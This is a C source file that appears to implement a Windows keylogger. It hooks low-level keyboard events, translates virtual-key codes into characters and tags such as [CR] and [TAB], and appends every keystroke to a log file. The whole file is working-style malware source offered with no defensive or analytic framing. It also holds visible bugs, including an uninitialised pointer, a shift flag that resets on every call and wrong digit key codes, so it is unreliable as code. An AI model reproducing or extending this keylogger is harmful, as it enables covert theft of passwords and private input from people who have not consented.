#include "hooking.h"

LRESULT CALLBACK keyboard_hooking (int ncode, WPARAM wParam, LPARAM lParam){
    KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *) lParam;
    char *atr = "[X]";
    char *str;

    if (wParam == WM_KEYUP){
        str = map_to_txt(kb->vkCode, 1);
    } else if (wParam == WM_IME_KEYDOWN){
        str = map_to_txt(kb->vkCode, 0);
    }

    if (str) log_char(str);
    return 0;
}

void log_char(char *str){
    fwrite(str, 1, strlen(str), fd);
    if (strstr(str, " ") || strstr(str, "[CR]")) fflush(fd);
}

char* map_to_txt(int vk, int up){
    int maj = 0;

    if (up){
        if ((vk == 0x10) || (vk == 0xa0) || (vk == 0xa1)) {
            maj = 0;
        }
    } else if ((vk == 0x10) || (vk == 0xa0) || (vk == 0xa1)){
        maj = 1;
        return "0";
    }
    char *buf = (char*)malloc(16);
    memset(buf, 0, 16);

    if (vk < 0x29){
        switch (vk){
            case 0x08: strcpy(buf, "[BS]"); break;
            case 0x09: strcpy(buf, "[TAB]"); break;
            case 0x0d: strcpy(buf, "[CR]"); break;
            case 0x14: VER_NUM = 1; break;
            case 0x20: buf[0] = ' '; break;
            case 0x25: strcpy(buf, "[LT]"); break;
            case 0x26: strcpy(buf, "[UP]"); break;
            case 0x27: strcpy(buf, "[RT]"); break;
            case 0x28: strcpy(buf, "[DN]"); break;
        }
        return buf;
    }

    if (vk > 0x69 && vk < 0x70){
        buf[0] = (char) (vk - 0x40);
    } else if (vk > 0x6f && vk < 0x88){
        sprintf(buf, "[F%d]", vk - 0x6f);
    } else if (isalpha(vk)){
        if (!VER_NUM){
            if (maj){
                buf[0] = (char) (toupper(vk));
            } else buf[0] = (char) (tolower(vk));
        } else {
            if (!maj){
                buf[0] = (char) (toupper(vk));
            } else buf[0] = (char) (tolower(vk));
        }
    } else {
        switch (vk){
            case 1:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '!';
                }
                break;
            case 2:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '@';
                }
                break;
            case 3:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '#';
                }
                break;
            case 4:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '$';
                }
                break;
            case 5:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '%';
                }
                break;
            case 6:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '^';
                }
                break;
            case 7:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '&';
                }
                break;
            case 8:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '*';
                }
                break;
            case 9:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '(';
                }
                break;
            case 0:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = ')';
                }
                break;
            case 0xba:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = ':';
                }
                break;
            case 0xbb:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '+';
                }
                break;
            case 0xbc:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '<';
                }
                break;
            case 0xbd:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '_';
                }
                break;
            case 0xbe:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '>';
                }
                break;
            case 0xbf:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '?';
                }
                break;
            case 0xc0:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '~';
                }
                break;
            case 0xdb:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '{';
                }
                break;
            case 0xdc:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '|';
                }
                break;
            case 0xdd:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '}';
                }
                break;
            case 0xde:
                if (!maj){
                    buf[0] = (char) vk;
                } else {
                    buf[0] = '\"';
                }
                break;
        }
    }
    return buf;
}